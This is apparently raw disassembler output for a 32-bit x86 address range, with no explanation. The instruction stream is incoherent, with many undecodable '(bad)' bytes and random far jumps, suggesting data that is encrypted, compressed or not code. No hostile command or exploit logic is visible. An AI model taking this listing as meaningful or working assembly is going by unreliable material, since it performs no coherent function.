  4060f5:	mov    cs,WORD PTR [eax]
  4060f7:	fild   WORD PTR [edi+edi*1]
  4060fa:	inc    BYTE PTR [ebx-0x2cfa57b]
  406100:	pop    ecx
  406101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406102:	mov    ds:0xbaf3ed10,eax
  406107:	adc    dl,BYTE PTR [edi+eax*1]
  40610a:	add    DWORD PTR [esi+0x42],esi
  40610d:	adc    eax,0x122392a2
  406112:	ins    BYTE PTR es:[edi],dx
  406113:	mov    bl,0xdc
  406115:	and    DWORD PTR [esi+0x37],edi
  406118:	ret    
  406119:	xor    eax,0x6159a7e3
  40611e:	mov    eax,ds:0x4cec401e
  406123:	sti    
  406124:	ret    
  406125:	mov    WORD PTR [eax+0x50],?
  406128:	sub    eax,0xb5995d48
  40612d:	lahf   
  40612e:	enter  0x24a8,0xf3
  406132:	call   eax
  406134:	daa    
  406135:	xchg   ebp,eax
  406136:	xor    BYTE PTR [esi],bh
  406138:	xchg   edx,eax
  406139:	ficom  WORD PTR [ecx+0x3ce2f107]
  40613f:	cdq    
  406140:	lds    esp,FWORD PTR [edi+0x5a12a511]
  406146:	dec    ebp
  406147:	cdq    
  406148:	xchg   ebx,eax
  406149:	inc    ebx
  40614a:	dec    ecx
  40614b:	lock int 0x19
  40614e:	add    DWORD PTR [esi+ecx*2+0x36],esi
  406152:	jns    0x406195
  406154:	adc    ah,bh
  406156:	retf   0x20ef
  406159:	push   cs
  40615a:	pop    esp
  40615b:	mov    es,WORD PTR [eax+0x39f71ef7]
  406161:	int    0x3b
  406163:	sbb    ch,bl
  406165:	into   
  406166:	mov    edx,0xaccfbf08
  40616b:	and    DWORD PTR [ecx-0x750d9354],ecx
  406171:	and    ecx,DWORD PTR [eax+0x3aedb999]
  406177:	push   ebx
  406178:	inc    edi
  406179:	xor    BYTE PTR [edx+eax*8+0x2b],0xde
  40617e:	push   esp
  40617f:	ret    
  406180:	sbb    ecx,0x54
  406183:	dec    esi
  406184:	shr    ebx,1
  406186:	neg    DWORD PTR [esi+0x44]
  406189:	aaa    
  40618a:	bound  esi,QWORD PTR [ecx-0x2b9ab932]
  406190:	push   ebp
  406191:	push   eax
  406192:	sub    cl,BYTE PTR [eax+0x388714a4]
  406198:	sub    al,0xbd
  40619a:	add    DWORD PTR [eax+0x0],ebp
  40619d:	push   edx
  40619e:	xchg   edi,eax
  40619f:	and    BYTE PTR [edi+0x2bb1802d],dh
  4061a5:	mov    BYTE PTR [ebp+0x41],ah
  4061a8:	sbb    edx,DWORD PTR [edx+esi*1+0x2bf5ab11]
  4061af:	imul   ebx,eax,0x2d
  4061b2:	cdq    
  4061b3:	and    edx,edi
  4061b5:	and    dh,BYTE PTR [edx+0x3a7852af]
  4061bb:	xchg   esp,eax
  4061bc:	(bad)  
  4061be:	or     BYTE PTR [esi],0xb4
  4061c1:	jno    0x40617a
  4061c3:	not    DWORD PTR [edx-0xc]
  4061c6:	mov    al,BYTE PTR [esp+ecx*1+0x2feac49f]
  4061cd:	test   eax,0x75d09318
  4061d2:	inc    edi
  4061d3:	(bad)  
  4061d4:	(bad)  
  4061d6:	xchg   esi,eax
  4061d7:	or     al,0x30
  4061d9:	cmp    ch,BYTE PTR [esi-0x63215af4]
  4061df:	sub    al,0x5d
  4061e1:	jp     0x4061bc
  4061e3:	repnz xor BYTE PTR [edi],cl
  4061e6:	punpckhbw mm3,QWORD PTR [edi]
  4061e9:	push   0xbf4e6580
  4061ee:	or     eax,0x8ed69c79
  4061f3:	test   al,0xcd
  4061f5:	lahf   
  4061f6:	push   ds
  4061f7:	sti    
  4061f8:	sbb    bl,BYTE PTR [ebx+esi*8-0x559abf22]
  4061ff:	loopne 0x40618e
  406201:	ffree  st(5)
  406203:	mov    ebp,0x34e90fad
  406208:	clc    
  406209:	into   
  40620a:	mov    bp,0xc3da
  40620e:	loopne 0x4061ae
  406210:	jmp    0x406215
  406212:	mov    eax,DWORD PTR [edx-0x7d]
  406215:	lods   eax,DWORD PTR ds:[esi]
  406216:	jae    0x40620e
  406218:	adc    cl,BYTE PTR [edx]
  40621a:	fnstsw WORD PTR [edi]
  40621c:	or     al,0x9b
  40621e:	int    0xd1
  406220:	add    al,0xd1
  406222:	or     BYTE PTR [edi-0x45895255],0x70
  406229:	add    cl,BYTE PTR [esp+esi*2+0x4f]
  40622d:	sahf   
  40622e:	dec    esp
  40622f:	sub    eax,0x5d70ccd8
  406234:	(bad)  
  406235:	out    0x6e,eax
  406237:	cmp    eax,0x7afc739f
  40623c:	js     0x406293
  40623e:	sub    eax,0xd21b698a
  406243:	or     bh,dh
  406245:	lods   al,BYTE PTR ds:[esi]
  406246:	out    0x53,al
  406248:	push   ecx
  406249:	mov    ebx,0xa5fc09b8
  40624e:	js     0x406207
  406250:	cmp    DWORD PTR [edx-0x52fc3543],esi
  406256:	cmp    al,0xaa
  406258:	xchg   esi,eax
  406259:	inc    ebx
  40625a:	outs   dx,BYTE PTR ds:[esi]
  40625b:	call   FWORD PTR [ecx+0x72]
  40625e:	je     0x40628c
  406260:	loope  0x406219
  406262:	cmp    eax,0x7220ee2c
  406267:	lods   al,BYTE PTR ds:[esi]
  406268:	dec    ebp
  406269:	out    0xc8,al
  40626b:	outs   dx,BYTE PTR ds:[esi]
  40626c:	rcr    DWORD PTR [ecx],cl
  40626e:	cdq    
  40626f:	mov    eax,ds:0x6ea6409a
  406274:	shl    al,1
  406276:	ds jge 0x4062b9
  406279:	aas    
  40627a:	mov    ds:0xbf2075ce,eax
  40627f:	ret    0x5947
  406282:	pushf  
  406283:	and    al,0x16
  406285:	cmp    edi,edx
  406287:	jecxz  0x4062ee
  406289:	(bad)  
  40628c:	pop    esi
  40628d:	mov    bl,0x62
  40628f:	fs mov bh,0xa3
  406292:	aad    0x7a
  406294:	(bad)  
  406295:	gs hlt 
  406297:	in     al,0xce
  406299:	test   eax,0x51f3f2fb
  40629e:	jne    0x406275
  4062a0:	aas    
  4062a1:	xor    al,0x71
  4062a3:	out    0x6,al
  4062a5:	ror    BYTE PTR [ebx+0x756b27a0],cl
  4062ab:	sub    DWORD PTR [esi-0x21d077ad],0x5b
  4062b2:	xor    DWORD PTR [ecx+0x24],0xcfac29a5
  4062b9:	mov    BYTE PTR [esi-0x1e],dh
  4062bc:	and    al,ch
  4062be:	loope  0x406339
  4062c0:	add    eax,0xc18347ca
  4062c5:	mov    ah,0x15
  4062c7:	sar    DWORD PTR [ebx+0x10d72479],cl
  4062cd:	mov    al,ds:0xf0c53e49
  4062d2:	lock pop ebp
  4062d4:	cmp    eax,0x98c9fba2
  4062d9:	dec    DWORD PTR [ecx]
  4062db:	sub    eax,0x90cc50b3
  4062e0:	retf   
  4062e1:	fwait
  4062e2:	imul   esp,DWORD PTR [ebx],0xd96cd3ab
  4062e8:	(bad)  
  4062e9:	and    ebp,DWORD PTR [ebx+0x25]
  4062ec:	push   esp
  4062ed:	das    
  4062ee:	(bad)  
  4062ef:	repz jb 0x406299
  4062f2:	out    0xff,al
  4062f4:	scas   al,BYTE PTR es:[edi]
  4062f5:	cmc    
  4062f6:	(bad)  
  4062f7:	lss    esp,FWORD PTR [eax-0x74a4c243]
  4062fe:	mov    eax,0xcf5d5d33
  406303:	jg     0x40630d
  406305:	or     DWORD PTR [ebp-0x3a],eax
  406308:	jno    0x406309
  40630a:	idiv   BYTE PTR [esi]
  40630c:	scas   al,BYTE PTR es:[edi]
  40630d:	jmp    0xd10cbfb6
  406312:	add    DWORD PTR [esi-0x2c],eax
  406315:	sbb    DWORD PTR [edi+0x2f],ebp
  406318:	push   esi
  406319:	adc    cl,BYTE PTR [eax-0x392051ef]
  40631f:	pop    ebp
  406320:	sbb    BYTE PTR [edx],bl
  406322:	pop    es
  406323:	icebp  
  406324:	lods   al,BYTE PTR ds:[esi]
  406325:	sub    al,0x38
  406327:	push   eax
  406328:	sub    BYTE PTR [ebx+0x5f],bh
  40632b:	push   ss
  40632c:	mov    ecx,0x800cbb5c
  406331:	xchg   edx,eax
  406332:	shl    DWORD PTR ds:0xdbde908b,0xd2
  406339:	xchg   esp,eax
  40633a:	cmp    eax,0x8d4bd453
  40633f:	fild   WORD PTR [esi+edx*2]
  406342:	enter  0x42c3,0x1
  406346:	std    
  406347:	inc    edx
  406348:	jg     0x406311
  40634a:	dec    ebp
  40634b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40634c:	inc    edi
  40634d:	retf   
  40634e:	adc    ebx,DWORD PTR [edi]
  406350:	adc    ah,BYTE PTR [ebx-0x69]
  406353:	cdq    
  406354:	adc    al,0x4
  406356:	mov    ?,WORD PTR [edx+0x3496e7e]
  40635c:	out    0x6b,eax
  40635e:	mov    esi,0xdc090620
  406363:	jb     0x406311
  406365:	out    dx,eax
  406366:	mov    ?,WORD PTR [esi]
  406368:	(bad)  [edi+0x30]
  40636b:	nop
  40636c:	add    ebx,DWORD PTR [ebx+0x3a]
  40636f:	test   DWORD PTR ds:0xedc4a07e,ebp
  406375:	int3   
  406376:	sar    DWORD PTR [edx-0x292778f9],0x72
  40637d:	lods   al,BYTE PTR ds:[esi]
  40637e:	pushf  
  40637f:	push   ebp
  406380:	sub    edx,edx
  406382:	scas   al,BYTE PTR es:[edi]
  406383:	jle    0x40633f
  406385:	mov    al,ds:0xc40c4710
  40638a:	adc    ch,BYTE PTR [esi]
  40638c:	dec    edi
  40638d:	ret    0x96a5
  406390:	fsubr  DWORD PTR [esi+edx*1+0x1dd3687c]
  406397:	mov    ebx,0x910fa084
  40639c:	mov    esi,0x84d58cf7
  4063a1:	jbe    0x40640f
  4063a3:	mov    edx,0x9846805e
  4063a8:	mov    edi,DWORD PTR [ebp+edx*2+0x3c]
  4063ac:	xchg   ecx,eax
  4063ad:	pop    ss
  4063ae:	retf   0x6e53
  4063b1:	add    DWORD PTR [edx+0x6044df5d],0x30
  4063b8:	xor    BYTE PTR [esi+0x19c5213e],dh
  4063be:	aas    
  4063bf:	push   edx
  4063c0:	mov    ds:0xb521cebd,al
  4063c5:	cs cmp edx,edx
  4063c8:	and    DWORD PTR ds:0x70745981,esp
  4063ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063cf:	adc    cl,dl
  4063d1:	ins    DWORD PTR es:[edi],dx
  4063d2:	(bad)  
  4063d3:	cld    
  4063d4:	bound  esp,QWORD PTR [ebp+0x7842680d]
  4063da:	call   0x3f725f79
  4063df:	sub    ecx,ebx
  4063e1:	inc    eax
  4063e2:	add    ah,BYTE PTR [ebp+0x58]
  4063e5:	out    dx,ax
  4063e7:	rcr    DWORD PTR [ebx-0x61],cl
  4063ea:	dec    eax
  4063eb:	js     0x406446
  4063ed:	call   0x2903166e
  4063f2:	pop    ds
  4063f3:	sbb    DWORD PTR [esi-0x6d],esp
  4063f6:	adc    DWORD PTR [ebp+0x60],eax
  4063f9:	cmp    dl,ch
  4063fb:	xchg   ebx,eax
  4063fc:	fmulp  st(4),st
  4063fe:	or     al,0xc6
  406400:	pop    edi
  406401:	hlt    
  406402:	mov    DWORD PTR [eax+0x27],0xb510d75
  406409:	sub    esp,DWORD PTR [eax+0x30]
  40640c:	pop    eax
  40640d:	cmc    
  40640e:	lahf   
  40640f:	fdiv   QWORD PTR [ecx+ebp*2+0x2]
  406413:	xchg   edi,eax
  406414:	xchg   ecx,eax
  406415:	nop
  406416:	iret   
  406417:	sahf   
  406418:	inc    ecx
  406419:	adc    al,0x5
  40641b:	jns    0x4063af
  40641d:	mov    eax,0xd9d15ee
  406422:	pushf  
  406423:	add    ch,BYTE PTR [eax+edi*2]
  406426:	add    dh,bl
  406428:	sub    BYTE PTR [eax-0x4c],0x71
  40642c:	mov    dh,0xc8
  40642e:	cmp    edx,edx
  406430:	pop    esi
  406431:	add    DWORD PTR [ecx],ecx
  406433:	mov    bl,0xe7
  406435:	or     eax,0x78e5229e
  40643a:	arpl   WORD PTR [ecx+0x558cf399],cx
  406440:	mov    ebp,0xe8374e60
  406445:	mov    esp,0x81bc152e
  40644a:	jnp    0x406490
  40644c:	sub    ecx,DWORD PTR cs:[edi+0x1980c428]
  406453:	in     eax,0x8b
  406455:	pop    ss
  406456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406457:	sub    ecx,eax
  406459:	sbb    eax,0x254da884
  40645e:	fbstp  TBYTE PTR [edi+0x38]
  406461:	push   ss
  406462:	sub    eax,0x8e48196a
  406467:	mov    ebp,0xa088ae0c
  40646c:	sub    edi,DWORD PTR [eax-0x11e4f91b]
  406472:	jne    0x40649f
  406474:	add    eax,0x20276480
  406479:	adc    cl,BYTE PTR [edx-0x7c]
  40647c:	aam    0x55
  40647e:	dec    edi
  40647f:	xchg   ebp,eax
  406480:	sbb    eax,0x4111d98a
  406485:	in     al,0xe4
  406487:	lods   al,BYTE PTR ds:[esi]
  406488:	shl    BYTE PTR [ecx+0x2e],1
  40648b:	xor    bh,BYTE PTR [edi-0x1f]
  40648e:	sbb    bh,dl
  406490:	and    al,0xd3
  406492:	xor    eax,0xc67865f0
  406497:	call   FWORD PTR [ecx+eax*2]
  40649a:	inc    esp
  40649b:	or     eax,0xc7a2d6ea
  4064a0:	pop    ds
  4064a1:	xor    al,bh
  4064a3:	push   ebp
  4064a4:	repz imul ecx,DWORD PTR [ebx],0x54
  4064a8:	nop
  4064a9:	(bad)  
  4064ab:	mov    eax,ds:0xd9990c0b
  4064b0:	adc    eax,0x11df0e03
  4064b5:	data16 sbb BYTE PTR [eax-0x7e],ah
  4064b9:	lods   eax,DWORD PTR ds:[esi]
  4064ba:	fwait
  4064bb:	cld    
  4064bc:	inc    eax
  4064bd:	add    al,0x8e
  4064bf:	pop    esi
  4064c0:	rcr    ch,1
  4064c2:	pop    eax
  4064c3:	mov    edx,0xcca5df32
  4064c8:	stos   BYTE PTR es:[edi],al
  4064c9:	sti    
  4064ca:	clc    
  4064cb:	retf   
  4064cc:	repz sbb DWORD PTR [edx-0x51],0xf25118e0
  4064d4:	push   cs
  4064d5:	mov    bh,BYTE PTR [edx-0x483042ec]
  4064db:	add    ch,0x79
  4064de:	fimul  WORD PTR [edx]
  4064e0:	push   edi
  4064e1:	fs add bl,0x67
  4064e5:	cmp    bh,BYTE PTR [eax+0x11]
  4064e8:	mov    BYTE PTR [ecx],cl
  4064ea:	add    al,0x50
  4064ec:	test   al,0x5b
  4064ee:	shr    dh,cl
  4064f0:	push   ecx
  4064f1:	pop    ebx
  4064f2:	outs   dx,DWORD PTR ds:[esi]
  4064f3:	jl     0x4064a5
  4064f5:	(bad)  
  4064f7:	mov    eax,0x5a3ef212
  4064fc:	clc    
  4064fd:	fnsave [esi+0x6b]
  406500:	lahf   
  406501:	jp     0x4064f8
  406503:	add    DWORD PTR [esi-0x28],esi
  406506:	mov    gs,ebx
  406508:	ins    DWORD PTR es:[edi],dx
  406509:	push   edi
  40650a:	jbe    0x406531
  40650c:	pop    ds
  40650d:	shl    esp,0x2b
  406510:	ins    BYTE PTR es:[edi],dx
  406511:	cmp    bl,al
  406513:	bound  eax,QWORD PTR ds:0x2db7894f
  406519:	mov    cl,0xbd
  40651b:	in     eax,0xe1
  40651d:	mov    dh,0x34
  40651f:	push   ss
  406520:	mov    esi,0x9c571c17
  406525:	push   ebp
  406526:	pushf  
  406527:	(bad)  
  406528:	or     eax,0x863739ca
  40652d:	xchg   esi,eax
  40652e:	aad    0xee
  406530:	rcl    BYTE PTR [ecx],cl
  406532:	inc    edx
  406533:	hlt    
  406534:	sbb    DWORD PTR [edi+0x78],0x52
  406538:	jp     0x40656f
  40653a:	push   edi
  40653b:	mov    esi,0x8effdb86
  406540:	or     BYTE PTR [ecx],0xa7
  406543:	frstor [ecx+0x3]
  406546:	sbb    BYTE PTR [edi+edi*1+0x48],dl
  40654a:	push   ebx
  40654b:	ds jne 0x406535
  40654e:	stos   DWORD PTR es:[edi],eax
  40654f:	pop    gs
  406551:	(bad)  
  406552:	mov    ds:0x39e0877e,eax
  406557:	xor    al,0x42
  406559:	scas   eax,DWORD PTR es:[edi]
  40655a:	xor    al,0x98
  40655c:	push   edx
  40655d:	in     al,0x7b
  40655f:	jns    0x4064f2
  406561:	mov    ds:0xa4066998,al
  406566:	push   ebx
  406567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406568:	pop    ebp
  406569:	in     al,dx
  40656a:	jb     0x406575
  40656c:	out    dx,al
  40656d:	and    al,0x5d
  40656f:	in     al,dx
  406570:	mov    dh,0x92
  406572:	jne    0x406587
  406574:	push   es
  406575:	rcl    BYTE PTR [esi],1
  406577:	aam    0x7c
  406579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657a:	gs sbb eax,0xaa42c993
  406580:	pop    ds
  406581:	pop    esi
  406582:	(bad)  
  406583:	cmp    BYTE PTR [edx],ah
  406585:	ja     0x40659c
  406587:	iret   
  406588:	aaa    
  406589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40658a:	mov    eax,ds:0x180786c4
  40658f:	das    
  406590:	adc    eax,0x3139217a
  406595:	push   esi
  406596:	ds add al,0x1a
  406599:	lds    eax,FWORD PTR [edi]
  40659b:	loop   0x4065dc
  40659d:	test   BYTE PTR [edi-0x36],dl
  4065a0:	pop    edx
  4065a1:	sbb    DWORD PTR [eax-0x1db766cd],edi
  4065a7:	add    eax,0xa5ccdd84
  4065ac:	int3   
  4065ad:	retf   0x1b99
  4065b0:	jbe    0x4065be
  4065b2:	and    esi,ebx
  4065b4:	dec    edi
  4065b5:	and    BYTE PTR [eax-0x770ac5ac],dl
  4065bb:	xchg   ebp,eax
  4065bc:	(bad)  
  4065bd:	jmp    0x406568
  4065bf:	in     eax,dx
  4065c0:	int3   
  4065c1:	shl    DWORD PTR ds:0xe25653bd,0x15
  4065c8:	mov    esi,0x307dc5ec
  4065cd:	iret   
  4065ce:	and    bl,BYTE PTR [eax]
  4065d0:	dec    ebx
  4065d1:	push   eax
  4065d2:	mov    eax,0x101fa3ed
  4065d7:	loope  0x4065f4
  4065d9:	xchg   esp,eax
  4065da:	mov    edx,?
  4065dc:	jo     0x4065ff
  4065de:	popf   
  4065df:	dec    edi
  4065e0:	fsubr  DWORD PTR [esi+eiz*2-0x66]
  4065e4:	imul   edx,DWORD PTR [eax+0x57fb1223],0x4e16366e
  4065ee:	mov    ds:0x3e26c3c1,eax
  4065f3:	dec    ebx
  4065f4:	out    dx,eax
  4065f5:	leave  
  4065f6:	cmp    cl,ch
  4065f8:	jmp    0xde9d:0x4a579fe2
  4065ff:	leave  
  406600:	inc    ebp
  406601:	jecxz  0x406627
  406603:	and    ebx,DWORD PTR [esi]
  406605:	jns    0x406669
  406607:	(bad)  
  406608:	jmp    0x40662a
  40660a:	or     bl,BYTE PTR [ebp+0x78]
  40660d:	dec    esp
  40660e:	mov    ch,0x8
  406610:	xchg   ah,ch
  406612:	lods   eax,DWORD PTR ds:[esi]
  406613:	push   ecx
  406614:	out    dx,eax
  406615:	xchg   BYTE PTR [ecx],dl
  406617:	push   ecx
  406618:	pop    esp
  406619:	xchg   ecx,eax
  40661a:	repz fnstenvw [ebx+0x6b]
  40661f:	push   ecx
  406620:	jle    0x4065bc
  406622:	fadd   DWORD PTR [edx]
  406624:	repnz ss xchg edx,eax
  406627:	push   es
  406628:	and    BYTE PTR [ecx],dl
  40662a:	fisttp QWORD PTR [esi]
  40662c:	aas    
  40662d:	cmp    eax,0x76a6b11d
  406632:	or     dh,al
  406634:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406636:	ja     0x406625
  406638:	es xchg ebp,eax
  40663a:	and    eax,0xffa8863a
  40663f:	jne    0x4065c2
  406641:	int3   
  406642:	mov    ah,0x90
  406644:	(bad)  
  406645:	fbld   TBYTE PTR [ebx]
  406647:	jg     0x4065fc
  406649:	push   ebx
  40664a:	cdq    
  40664b:	std    
  40664c:	push   ss
  40664d:	sub    ch,BYTE PTR [ebx]
  40664f:	or     DWORD PTR [ecx-0xc625394],eax
  406655:	push   ebx
  406656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406657:	mov    edx,0xec793eb8
  40665c:	mov    ah,0xee
  40665e:	cmp    DWORD PTR [esi+0x6b],esi
  406661:	out    0x9,al
  406663:	or     al,0x6
  406665:	icebp  
  406666:	add    DWORD PTR [esi-0x11aa0ea9],edi
  40666c:	neg    BYTE PTR [edi]
  40666e:	mov    al,0x57
  406670:	pop    edi
  406671:	push   ecx
  406672:	cmp    ah,BYTE PTR es:[ebx-0x64]
  406676:	xchg   DWORD PTR [esi-0x5e],edx
  406679:	lods   al,BYTE PTR ds:[esi]
  40667a:	in     al,0x85
  40667c:	or     eax,0x6dca952c
  406681:	inc    ebx
  406682:	popa   
  406683:	mov    bh,0x93
  406685:	pop    ds
  406686:	sbb    eax,0x1fe3fdcd
  40668b:	adc    ebp,DWORD PTR [edi+eiz*8]
  40668e:	xor    edx,DWORD PTR [eax-0x2b]
  406691:	frstor [ebx-0x556bab25]
  406697:	jae    0x406709
  406699:	dec    esp
  40669a:	mov    eax,0x8f3d3a70
  40669f:	and    al,0x85
  4066a1:	dec    edx
  4066a2:	pop    es
  4066a3:	push   ds
  4066a4:	sbb    esp,ebx
  4066a6:	dec    ebx
  4066a7:	nop
  4066a8:	dec    ecx
  4066a9:	(bad)  
  4066aa:	xlat   BYTE PTR ds:[ebx]
  4066ab:	(bad)  [esi]
  4066ad:	sbb    ah,al
  4066af:	push   es
  4066b0:	dec    al
  4066b2:	icebp  
  4066b3:	xchg   esp,eax
  4066b4:	xor    BYTE PTR [edx],0xb
  4066b7:	jns    0x406666
  4066b9:	sahf   
  4066ba:	fs mov ch,0x5f
  4066bd:	mov    BYTE PTR ds:0x1ab3d15e,bh
  4066c3:	dec    ebx
  4066c4:	test   eax,0x9e21333d
  4066c9:	dec    esp
  4066ca:	mov    ds:0xc7278d38,eax
  4066cf:	inc    ecx
  4066d0:	mov    fs,WORD PTR [eax-0x2ca4541e]
  4066d6:	(bad)  
  4066d7:	push   esi
  4066d8:	dec    ebx
  4066d9:	xor    eax,0x8499a10
  4066de:	aas    
  4066df:	and    al,0x5b
  4066e1:	xor    al,0x5d
  4066e3:	and    eax,0x81905c2e
  4066e8:	cmp    al,0x10
  4066ea:	rol    BYTE PTR [edi-0x595584c8],0x3c
  4066f1:	in     al,dx
  4066f2:	cwde   
  4066f3:	aam    0x51
  4066f5:	xchg   ebx,eax
  4066f6:	test   al,0x6a
  4066f8:	cs or  edi,0x755aec46
  4066ff:	jle    0x40672c
  406701:	mov    esi,0x36117351
  406706:	xlat   BYTE PTR ds:[ebx]
  406707:	frstpm(287 only) 
  406709:	ds mov ecx,0x511829a6
  40670f:	sub    DWORD PTR [eax-0x39],ebp
  406712:	out    0x1b,al
  406714:	dec    ecx
  406715:	push   esi
  406716:	dec    ecx
  406717:	scas   al,BYTE PTR es:[edi]
  406718:	shl    edx,0x14
  40671b:	jecxz  0x4066c0
  40671d:	cld    
  40671e:	push   cs
  40671f:	pop    ss
  406720:	loopne 0x4066cc
  406722:	fldcw  WORD PTR [esp+ebp*4-0x10]
  406726:	sahf   
  406727:	mov    dl,0x9
  406729:	ins    BYTE PTR es:[edi],dx
  40672a:	ret    0x3c3b
  40672d:	sbb    DWORD PTR [ebp-0x55],ecx
  406730:	sbb    eax,0xa44e85f9
  406735:	sbb    bh,BYTE PTR ds:[ebx]
  406738:	ins    DWORD PTR es:[edi],dx
  406739:	adc    BYTE PTR [ebx],dh
  40673b:	out    dx,eax
  40673c:	mov    es,WORD PTR [edx]
  40673e:	cld    
  40673f:	fstp   QWORD PTR [ecx-0x7]
  406742:	lods   al,BYTE PTR ds:[esi]
  406743:	mov    ch,0x9c
  406745:	xchg   ecx,eax
  406746:	das    
  406747:	jb     0x4066fb
  406749:	dec    BYTE PTR [edi+0x6b]
  40674c:	ret    0xb034
  40674f:	not    DWORD PTR ds:0xdf72f325
  406755:	fsub   QWORD PTR [eax+0x11]
  406758:	sub    esp,edi
  40675a:	push   0x39
  40675c:	stos   DWORD PTR es:[edi],eax
  40675d:	dec    ecx
  40675e:	sub    eax,0xb3436e69
  406763:	jae    0x40673c
  406765:	call   0xb50a:0x7549f6c2
  40676c:	sub    bl,BYTE PTR [ebx]
  40676e:	fnstcw WORD PTR [eax]
  406770:	scas   al,BYTE PTR es:[edi]
  406771:	(bad)  
  406772:	mov    bl,BYTE PTR [esi]
  406774:	inc    esi
  406775:	sbb    BYTE PTR [ebx-0x6b],bl
  406778:	mov    ah,0x5c
  40677a:	ins    DWORD PTR es:[edi],dx
  40677b:	xor    cl,ah
  40677d:	and    BYTE PTR [edi-0x69],bh
  406780:	push   esp
  406781:	pop    ebp
  406782:	out    dx,eax
  406783:	jmp    0x2b88772c
  406788:	mov    dh,0x20
  40678a:	shr    BYTE PTR [eax-0x72],cl
  40678d:	mov    bh,0x61
  40678f:	cmp    eax,0xf0377f8e
  406794:	cmp    ebx,DWORD PTR [esi]
  406796:	int    0x81
  406798:	aaa    
  406799:	xchg   ebx,eax
  40679a:	or     eax,DWORD PTR [edx+0x5cb58662]
  4067a0:	(bad)  
  4067a1:	lahf   
  4067a2:	mov    BYTE PTR [ebx],ch
  4067a4:	lahf   
  4067a5:	test   eax,0x9e8b3c5d
  4067aa:	sub    edx,DWORD PTR [edi]
  4067ac:	out    0xcb,eax
  4067ae:	pop    eax
  4067af:	sub    eax,0x348be923
  4067b4:	into   
  4067b5:	test   al,0xf3
  4067b7:	popf   
  4067b8:	pop    ecx
  4067b9:	dec    edi
  4067ba:	jl     0x4067ea
  4067bc:	push   es
  4067bd:	and    DWORD PTR [esi-0x6a],esi
  4067c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c1:	jns    0x406810
  4067c3:	shl    DWORD PTR [eax+0x739c388a],1
  4067c9:	xchg   edx,eax
  4067ca:	jge    0x4067e2
  4067cc:	(bad)  
  4067cd:	in     al,0x4a
  4067cf:	ror    ebx,cl
  4067d1:	fstp   st(7)
  4067d3:	mov    edx,ds
  4067d5:	dec    ecx
  4067d6:	inc    ebx
  4067d7:	ss mov edi,0x64689601
  4067dd:	fisubr DWORD PTR [ecx+0x14d37938]
  4067e3:	rcr    DWORD PTR [edx],1
  4067e5:	pop    esi
  4067e6:	jecxz  0x4067f8
  4067e8:	test   DWORD PTR [ebx+0x33df39b7],ebp
  4067ee:	loope  0x40678b
  4067f0:	inc    ebp
  4067f1:	adc    DWORD PTR [ecx-0x1641c90e],esi
  4067f7:	dec    edi
  4067f8:	rcl    BYTE PTR gs:[edx+0x4d],0x23
  4067fd:	dec    BYTE PTR [eax-0x35]
  406800:	push   ss
  406801:	pop    esp
  406802:	aas    
  406803:	xor    eax,0x68fa4a4b
  406808:	sar    BYTE PTR [esi-0x48],0xd6
  40680c:	outs   dx,DWORD PTR ds:[esi]
  40680d:	jmp    0x30aa188c
  406812:	retf   
  406813:	xchg   BYTE PTR [esi+eiz*1+0xf2388e8],dh
  40681a:	stc    
  40681b:	sub    DWORD PTR [eax-0x3ce48b87],edi
  406821:	add    dl,ah
  406823:	mov    esi,0xa6d8c655
  406828:	or     dl,0xe0
  40682b:	add    DWORD PTR [eax-0x67dfcdeb],ebp
  406831:	jne    0x4067dc
  406833:	adc    ah,BYTE PTR [edx]
  406835:	icebp  
  406836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406837:	je     0x40682c
  406839:	xor    BYTE PTR [edx-0x42],cl
  40683c:	inc    ecx
  40683d:	push   esp
  40683e:	xchg   edi,eax
  40683f:	es pop edx
  406841:	mov    ebp,0x2dc8a481
  406846:	fimul  DWORD PTR [ecx]
  406848:	cmp    dl,BYTE PTR [ebx-0x38]
  40684b:	push   esi
  40684c:	jmp    0xba38e5ed
  406851:	fsub   DWORD PTR [ebx+0x2a]
  406854:	out    dx,al
  406855:	dec    edi
  406856:	xor    ecx,DWORD PTR [ecx]
  406858:	(bad)  
  40685a:	mov    fs,WORD PTR [ebp-0xdf5c700]
  406860:	jns    0x406871
  406862:	cmp    BYTE PTR [esi+0x6450504b],0x7f
  406869:	adc    bl,BYTE PTR [eax+0x41e0a548]
  40686f:	mov    al,0xff
  406871:	mov    bl,0xed
  406873:	jg     0x406893
  406875:	popa   
  406876:	cmp    al,0xb0
  406878:	imul   ebp,esi,0x58
  40687b:	push   0x75
  40687d:	xchg   DWORD PTR [edx],ecx
  40687f:	push   ecx
  406880:	ins    BYTE PTR es:[edi],dx
  406881:	call   0x6f6db3c1
  406886:	inc    edi
  406887:	js     0x4068d1
  406889:	xlat   BYTE PTR ds:[ebx]
  40688a:	retf   0xa3e1
  40688d:	or     DWORD PTR [ecx+ebp*2-0x5c5b044a],edi
  406894:	pop    edi
  406895:	loop   0x4068ba
  406897:	dec    edx
  406898:	popa   
  406899:	dec    edi
  40689a:	out    0x77,al
  40689c:	add    esi,0x70
  40689f:	clc    
  4068a0:	xor    edi,DWORD PTR [edx]
  4068a2:	push   cs
  4068a3:	add    BYTE PTR [eax-0x2327a4ec],bh
  4068a9:	mov    DWORD PTR [esi],ebx
  4068ab:	pusha  
  4068ac:	(bad)  
  4068ad:	jmp    0x647:0x275fcb44
  4068b4:	repz push cs
  4068b6:	dec    esp
  4068b7:	sar    edi,0xb
  4068ba:	(bad)  
  4068bb:	sbb    DWORD PTR [ebp-0x53f3206c],esi
  4068c1:	pop    eax
  4068c2:	ins    BYTE PTR es:[edi],dx
  4068c3:	sar    BYTE PTR [ebp+0x23139729],1
  4068c9:	ss cmp al,0x70
  4068cc:	xchg   esp,eax
  4068cd:	(bad)  
  4068ce:	test   al,0x66
  4068d0:	lea    ebp,[eax]
  4068d2:	pop    ds
